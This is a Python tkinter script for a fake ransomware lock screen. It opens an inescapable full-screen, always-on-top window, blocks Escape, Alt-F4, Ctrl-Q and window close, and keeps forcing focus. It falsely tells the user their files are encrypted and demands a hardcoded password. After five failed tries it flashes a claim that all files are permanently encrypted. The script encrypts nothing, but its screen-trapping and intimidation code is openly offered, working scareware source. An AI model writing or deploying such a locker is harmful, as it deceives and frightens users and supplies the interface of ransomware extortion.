#!/usr/bin/env python3
import tkinter as tk
import sys

LOCK_PASSWORD = "felty-unlock-2024"
MAX_PASS_TRIES = 5

class LockApp:
    def __init__(self):
        self.attempts = 0
        self.wipe = False
        self.flash_state = False

        self.root = tk.Tk()
        self.root.title("Locked")
        self.root.overrideredirect(True)
        self.root.attributes("-fullscreen", True)
        try:
            self.root.attributes("-topmost", True)
        except Exception:
            pass
        self.root.configure(bg='black')
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.bind("<Escape>", lambda e: "break")
        self.root.bind_all("<Alt-F4>", lambda e: "break")
        self.root.bind_all("<Control-q>", lambda e: "break")

        self.frame = tk.Frame(self.root, bg='black')
        self.frame.pack(expand=True, fill='both')

        self.title = tk.Label(self.frame, text="SYSTEM LOCKED", fg='#ff3333', bg='black', font=("Courier", 56, 'bold'))
        self.title.pack(pady=(100, 20))

        self.info = tk.Label(
            self.frame,
            text="Your files have been encrypted. Enter password to unlock.",
            fg='#ff9999',
            bg='black',
            font=("Courier", 22)
        )
        self.info.pack(pady=(0, 20))

        self.attempt_label = tk.Label(
            self.frame,
            text=f"Attempts remaining: {MAX_PASS_TRIES - self.attempts}",
            fg='#ff9999',
            bg='black',
            font=("Courier", 18)
        )
        self.attempt_label.pack(pady=(0, 20))

        box = tk.Frame(self.frame, bg='#1a1a1a', bd=2, relief='solid')
        box.pack(pady=(0, 20))

        self.entry = tk.Entry(
            box,
            show='*',
            font=("Courier", 24),
            justify='center',
            bg='#000000',
            fg='white',
            insertbackground='white',
            bd=0,
            width=24
        )
        self.entry.pack(ipadx=20, ipady=16)
        self.entry.bind('<Return>', self.check_password)
        self.entry.focus_set()

        self.message = tk.Label(self.frame, text='', fg='#ff6666', bg='black', font=("Courier", 18))
        self.message.pack(pady=(10, 0))

        self.root.after(100, self.ensure_focus)

    def ensure_focus(self):
        try:
            self.root.focus_force()
            self.entry.focus_set()
        except Exception:
            pass
        self.root.after(1000, self.ensure_focus)

    def check_password(self, event=None):
        if self.wipe:
            return
        password = self.entry.get()
        if password == LOCK_PASSWORD:
            try:
                with open('felty_unlocked.txt', 'w') as f:
                    f.write('UNLOCKED')
            except Exception:
                pass
            self.root.destroy()
            sys.exit(0)

        self.attempts += 1
        remaining = MAX_PASS_TRIES - self.attempts
        if self.attempts >= MAX_PASS_TRIES:
            self.wipe = True
            self.entry.config(state='disabled')
            self.title.config(text='ALL FILES HAVE BEEN PERMANENTLY ENCRYPTED')
            self.info.config(text='NOTHING CAN RESET THEM')
            self.message.config(text='')
            self.attempt_label.config(text='')
            self.flash_screen()
        else:
            self.message.config(text=f'Wrong password. {remaining} attempts left.')
            self.attempt_label.config(text=f'Attempts remaining: {remaining}')
            self.entry.delete(0, 'end')

    def flash_screen(self):
        if not self.wipe:
            return
        self.flash_state = not self.flash_state
        bg = 'black' if self.flash_state else '#1a0000'
        fg = '#ff3333' if self.flash_state else 'white'

        self.root.configure(bg=bg)
        self.frame.configure(bg=bg)
        self.title.configure(bg=bg, fg=fg)
        self.info.configure(bg=bg, fg=fg)
        self.attempt_label.configure(bg=bg, fg=fg)
        self.message.configure(bg=bg, fg=fg)
        self.entry.configure(bg=bg, fg=fg, insertbackground=fg)

        self.root.after(300, self.flash_screen)

    def run(self):
        try:
            self.root.mainloop()
        except KeyboardInterrupt:
            pass

if __name__ == '__main__':
    app = LockApp()
    app.run()
